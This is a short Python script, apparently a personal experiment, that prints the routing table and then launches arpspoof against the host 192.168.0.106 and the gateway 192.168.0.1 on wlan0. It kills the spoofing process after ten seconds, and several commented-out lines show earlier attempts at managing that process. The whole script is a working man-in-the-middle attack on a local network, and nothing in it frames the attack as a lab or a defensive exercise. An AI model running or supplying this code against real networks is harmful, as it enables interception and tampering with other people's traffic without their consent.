import os
import subprocess as sub
import time
import signal
import psutil
from subprocess import check_call

def kill(proc_pid):
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.send_signal(signal.SIGINT)
    process.kill()

def arp():
    os.system("ip route")
    print("\n")
    proc = sub.Popen("sudo arpspoof -i wlan0 -t 192.168.0.106 -r 192.168.0.1".split())
    #time.sleep(5)
    #p.send_signal(signal.SIGINT)
    #os.kill(p.pid, signal.SIGKILL)
    # order = "sudo arpspoof -i wlan0 -t 192.168.0.106 -r 192.168.0.1"
    # os.system(order)
    # os.system("PID=$!")
    # os.system("")
    # os.system("kill -9 PID")
    try:
        proc.wait(timeout=10)
    except sub.TimeoutExpired:
        kill(proc.pid)
    return 0
    
    
    #pid = os.getpid()
    #time.sleep(2)
    #if os.system("PID=$!") or 1:
    #    return 1
    #os.system("kill PID")
  